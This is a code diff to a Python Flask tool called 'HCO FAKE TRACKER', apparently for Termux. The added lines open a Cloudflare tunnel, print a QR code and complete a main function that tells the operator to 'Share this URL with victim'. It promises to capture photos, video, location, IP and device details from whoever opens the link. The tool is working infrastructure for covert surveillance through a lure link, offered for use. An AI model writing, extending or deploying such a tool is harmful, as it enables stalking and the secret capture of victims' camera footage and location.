@@ -48,6 +48,28 @@ for path in GALLERY_PATHS:
 app = Flask(__name__)
 public_url = None
 
+def show_tool_lock_screen():
+    """Show the tool lock screen"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
+    
+    for i in range(3, 0, -1):
+        print(f"{Fore.RED}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
+        time.sleep(1)
+    
+    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
+    print(f"\n{Fore.GREEN}🎬 Opening YouTube...{Style.RESET_ALL}")
+    
+    try:
+        subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
+    except:
+        print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
+    
+    input(f"\n{Fore.YELLOW}🚨 Press Enter AFTER subscribing...{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ Tool unlocked!{Style.RESET_ALL}")
+    time.sleep(1)
+
 def save_to_all_locations(file_data, filename, file_type="photo"):
     """Save file to all gallery locations"""
     saved_paths = []
@@ -75,6 +97,114 @@ def save_to_all_locations(file_data, filename, file_type="photo"):
             pass
     
     return saved_paths
+
+def install_cloudflared():
+    """Install cloudflared"""
+    try:
+        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ cloudflared is installed{Style.RESET_ALL}")
+            return True
+    except:
+        pass
+    
+    print(f"{Fore.YELLOW}📥 Installing cloudflared...{Style.RESET_ALL}")
+    try:
+        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], 
+                              capture_output=True, text=True, timeout=120)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ cloudflared installed{Style.RESET_ALL}")
+            return True
+    except:
+        pass
+    
+    print(f"{Fore.RED}❌ Failed to install cloudflared{Style.RESET_ALL}")
+    return False
+
+def start_cloudflare_tunnel():
+    """Start Cloudflare tunnel"""
+    global public_url
+    
+    print(f"{Fore.CYAN}🚀 Starting CLOUDFLARE tunnel...{Style.RESET_ALL}")
+    
+    subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
+    time.sleep(2)
+    
+    try:
+        process = subprocess.Popen([
+            'cloudflared', 'tunnel',
+            '--url', f'http://localhost:{PORT}'
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel (25 seconds)...{Style.RESET_ALL}")
+        time.sleep(25)
+        
+        # Try to get URL
+        for attempt in range(10):
+            try:
+                line = process.stderr.readline()
+                if '.trycloudflare.com' in line:
+                    import re
+                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+                    if urls:
+                        public_url = urls[0]
+                        print(f"{Fore.GREEN}✅ CLOUDFLARE URL: {public_url}{Style.RESET_ALL}")
+                        return public_url
+            except:
+                pass
+            time.sleep(2)
+        
+        print(f"{Fore.YELLOW}⚠️ Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
+        return "cloudflare_active"
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Cloudflare error: {e}{Style.RESET_ALL}")
+        return None
+
+def get_local_ip():
+    """Get local IP"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
+def display_banner():
+    """Display banner"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
+
+def display_qr_in_termux(url):
+    """Display QR code"""
+    try:
+        qr = qrcode.QRCode(version=1, box_size=2, border=2)
+        qr.add_data(url)
+        qr.make(fit=True)
+        
+        qr_matrix = qr.get_matrix()
+        qr_text = ""
+        for row in qr_matrix:
+            line = ""
+            for cell in row:
+                line += "██" if cell else "  "
+            qr_text += line + "\n"
+        
+        print(f"\n{Fore.GREEN}📲 QR Code:{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🔗 URL: {url}{Style.RESET_ALL}")
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        img.save(QR_PNG)
+        print(f"{Fore.GREEN}💾 QR saved: {QR_PNG}{Style.RESET_ALL}")
+        return True
+    except:
+        return False
 
 # COMPLETE HTML WITH WORKING JAVASCRIPT
 HTML_PAGE = '''
@@ -747,13 +877,52 @@ def fallback_data():
             pass
     return jsonify({"status": "logged"})
 
-# [Rest of the tunneling code remains the same...]
-# Include all the tunnel functions from previous code
-
 def main():
-    # [Include all the main function code from previous version]
-    # This includes the tunnel setup, QR generation, etc.
-    pass
+    global public_url
+    
+    # Show lock screen
+    show_tool_lock_screen()
+    display_banner()
+    
+    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WAN TUNNEL SETUP ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🔄 Setting up Cloudflare tunnel for WAN access...{Style.RESET_ALL}")
+    
+    # Try Cloudflare tunnel
+    if install_cloudflared():
+        final_url = start_cloudflare_tunnel()
+        service_name = "CLOUDFLARE"
+    else:
+        # Fallback to local
+        local_ip = get_local_ip()
+        final_url = f"http://{local_ip}:{PORT}"
+        service_name = "LOCAL"
+    
+    # If Cloudflare failed, use local
+    if not final_url or final_url == "cloudflare_active":
+        local_ip = get_local_ip()
+        final_url = f"http://{local_ip}:{PORT}"
+        service_name = "LOCAL"
+        print(f"{Fore.RED}❌ Using local URL (only same WiFi){Style.RESET_ALL}")
+    
+    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🔧 Service: {service_name}{Style.RESET_ALL}")
+    
+    if service_name != "LOCAL":
+        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}❌ Only works on same WiFi network{Style.RESET_ALL}")
+    
+    display_qr_in_termux(final_url)
+    
+    print(f"\n{Fore.YELLOW}🚀 Share this URL with victim{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}📸 Will capture: 3 photos + 5s video + Location + IP + Device info{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
+    
+    try:
+        app.run(host=HOST, port=PORT, debug=False)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
